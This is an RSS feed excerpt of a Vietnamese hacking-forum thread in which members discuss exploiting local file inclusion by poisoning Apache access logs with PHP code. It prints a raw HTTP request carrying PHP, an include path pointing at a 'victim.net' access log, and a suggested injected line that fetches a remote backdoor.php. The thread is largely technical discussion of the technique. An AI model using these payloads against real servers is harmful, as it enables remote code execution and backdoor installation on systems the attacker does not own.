				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ hì hì, tui cũng chỉ làm theo gợi ý của bác conmale với QVT. pnco nhắc tui mới đọc cái đoạn tụi Tây.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77706</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77706</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 20:31:01]]> GMT</pubDate>
				<author><![CDATA[ gsmth]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Hơ ngày xưa mình cũng nghiên cứu kịch bản này ! &gt;__&lt; cái hồi còn bug webmin :D . Tựu chung là local file inclusion, tiếc là nó chỉ dễ thực hiện với PHP còn CGI thì không thành công .Đại khái là để apache dính log có dạng :
<blockquote>
abcerrorac.ac.&lt;?php include($remotefile); ?&gt;xyztvdsvsdn
&nbsp;
		</blockquote>
)
Không biết ngoài kịch bản này ra còn có gì nữa không nhỉ :) Anh em bàn luận hay quá :p]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77710</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77710</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 20:44:39]]> GMT</pubDate>
				<author><![CDATA[ dinhcaohack]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Cám ơn mọi người đã thảo luận. Chắc mọi người đã có lời giải cho vấn đề rùi phải ko ạh : mrgreen : 

Gửi HTTP request giả chứa code PHP đến server -&gt; Apache ghi log vào file -&gt; local include cái file log của Apache. Vậy là ta có thể chạy dc code PHP.
@anh gamma: cách exploit khôn hơn em vẫn chưa nghĩ ra. Hì hì..

P/S: bài post về vấn đề này, QVT sẽ ko post ở đây (vì nó gần giống với nội dung mà anh gamma95 đưa lên) mà sẽ dc post vào Box thích hợp.
Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77733</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#77733</link>
				<pubDate><![CDATA[Tue, 7 Aug 2007 23:51:58]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ mọi người cho hỏi tí nhé. Nếu ta nhập code vào trình duyệt 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>http://localhost:80/&lt;?echo&#40;'bad_code'&#41;;?&gt;</pre>
		</div>
thì trong access.log đoạn url trên bị mã hóa:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>127.0.0.1 - - &#91;20/Sep/2007:19:16:40 +0700&#93; "GET /%3C?echo%20%20bad_code%20%20;%3F%3E HTTP/1.1" 403 1106</pre>
		</div>
Còn nếu ta đưa thẳng vào HTTP request 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>GET<span class="link"> http://localhost:80/&lt;?echo&#40;'bad_code'&#41;;?&gt;/</span> HTTP/1.1
Accept: */*.
Accept-Language: en-us.
Accept-Encoding: deflate.
User-Agent: Mozilla/4.0 &#40;compatible; MSIE 5.0; Windows NT 5.0&#41;
Host: localhost
Connection: Close</pre>
		</div>
thì trong log lại ghi là
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>127.0.0.1 - - &#91;20/Sep/2007:19:12:29 +0700&#93; "GET /&lt;?echo&#40;'bad_code'&#41;;?&gt;/ HTTP/1.1" 403 1106</pre>
		</div>
Như vậy là do trình duyệt sẽ mã hóa url khi gửi đi đúng không?

Còn nữa, trong log file của tui không lưu lại User agent nên cách chỉnh general.useragent.extra.firefox trong about:config của gsmth không thể thực hiện được (tui dùng xampp trên Windows). Thậm chí khi chỉnh lại useragent bằng 1 đoạn code thì sau đó tui không thể vào được HVA, mặc dù các trang khác vẫn vào bình thường. HVA bảo mật ghê thật :)
]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#86010</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#86010</link>
				<pubDate><![CDATA[Thu, 20 Sep 2007 21:30:07]]> GMT</pubDate>
				<author><![CDATA[ nhuhoang]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">nhuhoang wrote:</cite><br>
		<blockquote>mọi người cho hỏi tí nhé. Nếu ta nhập code vào trình duyệt 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>http://localhost:80/&lt;?echo&#40;'bad_code'&#41;;?&gt;</pre>
		</div>
thì trong access.log đoạn url trên bị mã hóa:
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>127.0.0.1 - - &#91;20/Sep/2007:19:16:40 +0700&#93; "GET /%3C?echo%20%20bad_code%20%20;%3F%3E HTTP/1.1" 403 1106</pre>
		</div>
Còn nếu ta đưa thẳng vào HTTP request 
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>GET<span class="link"> http://localhost:80/&lt;?echo&#40;'bad_code'&#41;;?&gt;/</span> HTTP/1.1
Accept: */*.
Accept-Language: en-us.
Accept-Encoding: deflate.
User-Agent: Mozilla/4.0 &#40;compatible; MSIE 5.0; Windows NT 5.0&#41;
Host: localhost
Connection: Close</pre>
		</div>
thì trong log lại ghi là
<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>127.0.0.1 - - &#91;20/Sep/2007:19:12:29 +0700&#93; "GET /&lt;?echo&#40;'bad_code'&#41;;?&gt;/ HTTP/1.1" 403 1106</pre>
		</div>
Như vậy là do trình duyệt sẽ mã hóa url khi gửi đi đúng không?

Còn nữa, trong log file của tui không lưu lại User agent nên cách chỉnh general.useragent.extra.firefox trong about:config của gsmth không thể thực hiện được (tui dùng xampp trên Windows). Thậm chí khi chỉnh lại useragent bằng 1 đoạn code thì sau đó tui không thể vào được HVA, mặc dù các trang khác vẫn vào bình thường. HVA bảo mật ghê thật :)
&nbsp;
		</blockquote>

Nếu đưa URL như trên vào thanh địa chỉ của trình duyệt thì nó được encode <font color='orange'>-1-</font> ở dạng URLencode bởi vì (hầu hết) các trình duyệt hiện nay đều làm thế.

Nếu đưa URL như trên vào telnet hay netcat hay công cụ tương tự, nó không được encode bởi vì đây là <b>raw</b> request. Thông tin gõ thế nào trên console (telnet hay netcat) thì nó đi đến web server y hệt như thế.

Trên HVA, gần như mọi giá trị được đưa vào HTTP headers đều được kiểm tra và cản lọc. Đây là tính bảo mật. Tuy vậy, nó có cái giá của nó: chậm hơn các site không bảo mật ở mức độ này.

Thân mến.

<font color='orange'>-1-</font>: từ <b>encode</b> không thể dịch thành <b>mã hóa</b> được bởi vì encode khác với encrypt (được dịch là mã hóa). Tôi chưa thấy từ này được dịch ra tiếng Việt. ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#86072</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#86072</link>
				<pubDate><![CDATA[Fri, 21 Sep 2007 07:24:08]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ Nếu như nó là server riêng,thay đổi mấy cái mặt định thì sao hả mấy anh,chỉ em với ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#91065</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#91065</link>
				<pubDate><![CDATA[Wed, 17 Oct 2007 11:24:29]]> GMT</pubDate>
				<author><![CDATA[ ckj8899]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">ckj8899 wrote:</cite><br>
		<blockquote>Nếu như nó là server riêng,thay đổi mấy cái mặt định thì sao hả mấy anh,chỉ em với &nbsp;
		</blockquote>

Thay đổi mấy cái "<b>mặt</b>" định nào?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#91067</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#91067</link>
				<pubDate><![CDATA[Wed, 17 Oct 2007 11:42:26]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Re: [Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ To thiendt:
Bạn nên tìm trên diễn đàn trước khi đặt câu hỏi và cũng nên học cách đặt câu hỏi.
Đây là 1 chủ đề "thảo luận" chứ không phải là 1 chủ đề "hỏi đáp". Các vấn đề "hỏi đáp" không liên quan đến chủ đề xin bạn vui lòng tạo 1 chủ đề mới.
Chú ý không gửi liên tục các bài có nội dung giống nhau.

Thân.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#92272</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#92272</link>
				<pubDate><![CDATA[Mon, 22 Oct 2007 18:38:53]]> GMT</pubDate>
				<author><![CDATA[ Quan Vân Trường]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>thực ra đề bài QVT cho là thừa dữ kiện, và cái
?html=/home/hostings/webs/victim.net/logs/access_log
của đống chí gsmth
có cách nào đơn giản hơn ko ??
và cách inject code backdoor vào, có cách nào inject khôn hơn tụi tây kia nói ko??&nbsp;
		</blockquote>

Có cách nào đơn giản hơn thì em hem bik :D

<blockquote>
và cách inject code backdoor vào, có cách nào inject khôn hơn tụi tây kia nói ko??&nbsp;
		</blockquote>

Còn cái này thì em nghĩ là : &lt;? include ('http://link/backdoor.php'); /* ?&gt; or ? include ('$xxx'); /* ?&gt; ! ít nhất thì cũng hay hơn bọn tây kia inject :D

==&gt; ?html=/home/hostings/webs/victim.net/logs/access_log?xxx=[link] &lt;--- loại được các cái thừa ko cần đến mà log ghi lại !]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#149782</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#149782</link>
				<pubDate><![CDATA[Thu, 4 Sep 2008 23:32:40]]> GMT</pubDate>
				<author><![CDATA[ flier_vn]]></author>
			</item>
			<item>
				<title>[Thảo luận] Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">flier_vn wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>thực ra đề bài QVT cho là thừa dữ kiện, và cái
?html=/home/hostings/webs/victim.net/logs/access_log
của đống chí gsmth
có cách nào đơn giản hơn ko ??
và cách inject code backdoor vào, có cách nào inject khôn hơn tụi tây kia nói ko??&nbsp;
		</blockquote>

Có cách nào đơn giản hơn thì em hem bik :D

<blockquote>
và cách inject code backdoor vào, có cách nào inject khôn hơn tụi tây kia nói ko??&nbsp;
		</blockquote>

Còn cái này thì em nghĩ là : &lt;? include ('http://link/backdoor.php'); /* ?&gt; or ? include ('$xxx'); /* ?&gt; ! ít nhất thì cũng hay hơn bọn tây kia inject :D

==&gt; ?html=/home/hostings/webs/victim.net/logs/access_log?xxx=[link] &lt;--- loại được các cái thừa ko cần đến mà log ghi lại !&nbsp;
		</blockquote>

allow_url_include = off
allow_url_fopen = off
thì sao hả bạn :D
Backdoor phải là .txt chứ sao lại là PHP :P]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#203613</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#203613</link>
				<pubDate><![CDATA[Tue, 19 Jan 2010 21:15:46]]> GMT</pubDate>
				<author><![CDATA[ Archimonde]]></author>
			</item>
			<item>
				<title> Khai thác lỗi này như thế nào ?!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Archimonde wrote:</cite><br>
		<blockquote>

allow_url_include = off
allow_url_fopen = off
thì sao hả bạn :D
Backdoor phải là .txt chứ sao lại là PHP :P&nbsp;
		</blockquote>

Đây là local file inclusion mà bồ, có phải là RFI đâu mà url include ở đây :| .]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/12888.hva#203628</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/12888.hva#203628</link>
				<pubDate><![CDATA[Wed, 20 Jan 2010 01:19:13]]> GMT</pubDate>
				<author><![CDATA[ PhanPhungTien]]></author>
			</item>
	</channel>
</rss>
